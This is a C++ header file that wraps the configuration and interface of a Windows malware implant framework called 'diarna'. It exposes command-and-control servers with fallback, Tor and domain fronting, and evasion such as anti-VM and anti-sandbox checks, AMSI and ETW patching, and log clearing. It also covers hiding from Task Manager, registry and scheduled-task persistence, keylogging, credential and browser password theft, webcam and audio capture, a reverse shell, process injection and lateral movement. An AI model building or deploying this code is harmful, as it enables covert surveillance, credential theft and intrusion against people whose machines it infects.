#pragma once

#include <cstddef>
#include <cstdint>

#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#define OBF_UNSUPPORTED
#include <obfuscation/obfusheader.h>
#include <diarna/diarna.hpp>

#include <string>
#include <vector>
#include <span>
#include <functional>
#include <chrono>

namespace diarna {

using Config = diarna::Config;
using DiarnaFramework = diarna::DiarnaFramework;
using ChaCha20Poly1305 = diarna::crypto::ChaCha20Poly1305;
using Keylogger = diarna::collection::Keylogger;
using ClipboardMonitor = diarna::collection::ClipboardMonitor;
using CredentialDumper = diarna::collection::CredentialDumper;
using CredentialHarvester = diarna::collection::CredentialHarvester;
using CredentialEntry = diarna::collection::CredentialEntry;
using LateralMovement = diarna::movement::LateralMovement;
using ReverseShell = diarna::comm::ReverseShell;
using C2Protocol = diarna::comm::C2Protocol;
using CommandType = diarna::comm::CommandType;
using StealthTransport = diarna::comm::StealthTransport;
using FrontingConfig = diarna::comm::FrontingConfig;
using Executor = diarna::exec::Executor;
using ProcessInjector = diarna::exec::ProcessInjector;
using InjectionMethod = diarna::exec::InjectionMethod;
using InjectionConfig = diarna::exec::InjectionConfig;
using StubInjector = diarna::exec::StubInjector;
using ExploitInterface = diarna::exec::ExploitInterface;
using ExploitPayload = diarna::exec::ExploitPayload;
using Screenshot = diarna::capture::Screenshot;
using Audio = diarna::capture::Audio;
using Webcam = diarna::capture::Webcam;
using WebRTCStreamer = diarna::capture::WebRTCStreamer;
using DesktopDuplicator = diarna::capture::DesktopDuplicator;
using PersistenceManager = diarna::persistence::PersistenceManager;
using PersistenceMethod = diarna::persistence::Method;

struct AgentConfig {
    std::string agent_id;
    std::string c2_host;          uint16_t c2_port = 0;
    std::string c2_host_fallback;  uint16_t c2_port_fallback = 0;
    std::array<uint8_t, 32> encryption_key{};

    bool tor_enabled = false;
    bool domain_fronting = false;
    std::string cdn_front;
    std::string cdn_host;

    bool anti_vm = true;
    bool anti_debug = true;
    bool anti_sandbox = true;
    bool anti_anyrun = true;
    bool patch_etw = true;
    bool patch_amsi = true;
    bool hide_from_taskmgr = true;
    bool mask_pid = true;
    bool vault_memory = true;

    bool survive_reboot = false;
    bool keylogger = false;
    bool clipboard = false;
    bool wifi_dump = false;
    bool browser_dump = false;

    std::string wifi_ssid;
    std::string usb_device_id;
    std::string not_before_date;
    std::string expire_date;
};

class Agent {
public:
    Agent(const AgentConfig& cfg);
    ~Agent();

    bool arm();
    bool deploy();
    void stand_down();
    bool is_active() const;

    Executor& exec();
    Screenshot& screenshot();
    Audio& audio();
    Webcam& webcam();
    WebRTCStreamer& webrtc();
    DesktopDuplicator& desktop();
    Keylogger& keylogger();
    ClipboardMonitor& clipboard();
    CredentialDumper& credentials();
    CredentialHarvester& harvester();
    LateralMovement& movement();
    ReverseShell& shell();
    StubInjector& stubs();
    ExploitInterface& exploits();

    struct Status {
        std::string id; bool active; bool tor; uint64_t uptime;
        size_t vault_pages; uint64_t mutations; std::string sandbox;
        std::vector<std::string> persistence;
        std::vector<std::string> evasion;
    };
    Status status() const;

private:
    Config build_config(const AgentConfig& in);
    std::unique_ptr<DiarnaFramework> framework_;
    AgentConfig cfg_;
};

inline Agent::Agent(const AgentConfig& cfg) : cfg_(cfg) {
    framework_ = std::make_unique<DiarnaFramework>(build_config(cfg));
}

inline Agent::~Agent() { if (framework_) framework_->stand_down(); }

inline bool Agent::arm() { return framework_->arm(); }
inline bool Agent::deploy() { return framework_->deploy(); }
inline void Agent::stand_down() { framework_->stand_down(); }
inline bool Agent::is_active() const { return framework_->is_active(); }

inline Executor& Agent::exec() { static Executor e; return e; }
inline Screenshot& Agent::screenshot() { return framework_->screenshot(); }
inline Audio& Agent::audio() { return framework_->audio(); }
inline Webcam& Agent::webcam() { return framework_->webcam(); }
inline WebRTCStreamer& Agent::webrtc() { return framework_->webrtc(); }
inline DesktopDuplicator& Agent::desktop() { return framework_->desktop(); }
inline Keylogger& Agent::keylogger() { return framework_->keylogger(); }
inline ClipboardMonitor& Agent::clipboard() { return framework_->clipboard(); }
inline CredentialDumper& Agent::credentials() { return framework_->credentials(); }
inline CredentialHarvester& Agent::harvester() { return framework_->harvester(); }
inline LateralMovement& Agent::movement() { return framework_->movement(); }
inline ReverseShell& Agent::shell() { return framework_->shell(); }
inline StubInjector& Agent::stubs() { return StubInjector::instance(); }
inline ExploitInterface& Agent::exploits() { return ExploitInterface::instance(); }

inline Agent::Status Agent::status() const {
    auto s = framework_->status();
    return {s.agent_id, s.is_active, s.tor_ready, s.uptime_sec,
            s.vault_pages, s.mutations_total, s.sandbox_detection,
            s.active_persistence, s.evasion_active};
}

inline Config Agent::build_config(const AgentConfig& in) {
    Config c;
    c.agent_id = in.agent_id;
    c.encryption_key = in.encryption_key;

    if (in.c2_host.size()) {
        c.comm.servers.push_back({in.c2_host, in.c2_port});
        if (in.c2_host_fallback.size())
            c.comm.servers.push_back({in.c2_host_fallback, in.c2_port_fallback});
    }
    c.comm.tor.enabled = in.tor_enabled;

    c.stealth.anti_vm = in.anti_vm;
    c.stealth.anti_debug = in.anti_debug;
    c.stealth.anti_sandbox = in.anti_sandbox;
    c.stealth.anti_anyrun = in.anti_anyrun;
    c.stealth.patch_etw = in.patch_etw;
    c.stealth.patch_amsi = in.patch_amsi;
    c.stealth.vault_memory = in.vault_memory;
    c.stealth.unlink_peb = true;
    c.stealth.anti_hook = true;
    c.stealth.clear_logs = true;

    c.persistence.hide_taskmgr = in.hide_from_taskmgr;
    c.persistence.mask_pid = in.mask_pid;
    c.persistence.registry_run = in.survive_reboot;
    c.persistence.scheduled_task = in.survive_reboot;
    c.persistence.startup_folder = in.survive_reboot;

    c.collection.keylogger = in.keylogger;
    c.collection.clipboard = in.clipboard;
    c.collection.wifi_passwords = in.wifi_dump;
    c.collection.browser_passwords = in.browser_dump;

    if (in.wifi_ssid.size()) {
        c.environment.enabled = true;
        c.environment.wifi_ssids.push_back(in.wifi_ssid);
    }
    if (in.usb_device_id.size()) {
        c.environment.enabled = true;
        c.environment.usb_vid_pid.push_back(in.usb_device_id);
    }
    if (in.not_before_date.size()) { c.environment.enabled = true; c.environment.required_date = in.not_before_date; }
    if (in.expire_date.size()) { c.environment.enabled = true; c.environment.expire_date = in.expire_date; }

    return c;
}
    
} // namespace diarna

